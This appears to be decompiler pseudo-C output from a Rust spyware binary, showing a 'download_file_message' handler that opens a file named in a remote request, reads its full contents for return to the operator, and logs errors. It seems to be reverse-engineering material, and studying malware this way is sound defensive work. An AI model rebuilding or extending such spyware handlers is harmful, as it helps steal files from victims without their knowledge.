
  int128_t* spyware::actions::basic_info::download_file_message::h8a802bf593e1dd2f(int128_t* arg1, int64_t* arg2)

{
    char const* const var_c0;
    char const (** const var_98)[0x47];
    int64_t* var_88;
    int64_t* var_58;
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
    {
        var_58 = arg2;
        int64_t (* var_50_1)(void* arg1, int64_t* arg2) =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
        var_98 = &data_4b9810;
        int64_t var_90_1 = 2;
        int64_t var_78_1 = 0;
        var_88 = &var_58;
        int64_t var_80_1 = 1;
        int64_t rax_1 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9860);
        var_c0 = "spyware::actions::basic_infoHand…";
        int64_t var_b8_1 = 0x1c;
        char const* const var_b0_1 = "spyware::actions::basic_infoHand…";
        int64_t var_a8_1 = 0x1c;
        int64_t var_a0_1 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_98, 4, &var_c0);
    }
    
    char var_68;
    int64_t rdx_2 = std::fs::File::open::h9ff4b407758639b8(&var_68, arg2);
    
    if (!(var_68 & 1))
    {
        int32_t var_64;
        var_c0 = var_64;
        var_98 = nullptr;
        int64_t var_90_3 = 1;
        int64_t var_88_1 = 0;
        char rax_7;
        int64_t rdx_4;
        rax_7 = _$LT$std..fs..File$u20$as$u20$std..io..Read$GT$::read_to_end::hc5ce334212601c81(
            &var_c0, &var_98);
        core::result::Result$LT$T$C$E$GT$::unwrap::hb253015956d15545(rax_7, rdx_4);
        arg1[1] = var_88_1;
        *arg1 = var_98;
        *(arg1 + 0x18) = -0x8000000000000000;
        core::ptr::drop_in_place$LT$std..fs..File$GT$::hb5daeec03bf79b51(var_c0);
    }
    else
    {
        int64_t var_60;
        int64_t r15_1 = var_60;
        int64_t var_c8 = r15_1;
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
        {
            void var_38;
            _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h89fbb585ce883e17(
                &var_38, &var_c8, rdx_2);
            var_58 = arg2;
            int64_t (* var_50_2)(void* arg1, int64_t* arg2) = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            void* var_48_1 = &var_38;
            int64_t (* var_40_1)(void* arg1, int64_t* arg2) = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            var_98 = &data_4b9830;
            int64_t var_90_2 = 3;
            int64_t var_78_2 = 0;
            var_88 = &var_58;
            int64_t var_80_2 = 2;
            int64_t rax_3 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9890);
            var_c0 = "spyware::actions::basic_infoHand…";
            int64_t var_b8_2 = 0x1c;
            char const* const var_b0_2 = "spyware::actions::basic_infoHand…";
            int64_t var_a8_2 = 0x1c;
            int64_t var_a0_2 = rax_3;
            log::__private_api::log::h13afddf373bd7d7f(&var_98, 1, &var_c0);
            rdx_2 =
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h46afe0b9deda2fc5(&var_38);
            r15_1 = var_c8;
        }
        
        var_c0 = nullptr;
        int64_t var_b8_3 = 1;
        int64_t var_b0_3 = 0;
        std::io::error::repr_bitpacked::decode_repr::h049ae64b4e643a43(&var_98, r15_1);
        char r15_2 = var_98;
        int32_t rbp_1 = *var_98[4];
        _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h89fbb585ce883e17(
            &var_98, &var_c8, rdx_2);
        *(arg1 + 0x28) = var_88;
        *(arg1 + 0x18) = var_98;
        arg1[1] = var_b0_3;
        *arg1 = var_c0;
        arg1[3] = (0 - 0) | rbp_1;
        core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_c8);
    }
    
    core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(arg2);
    return arg1;
}
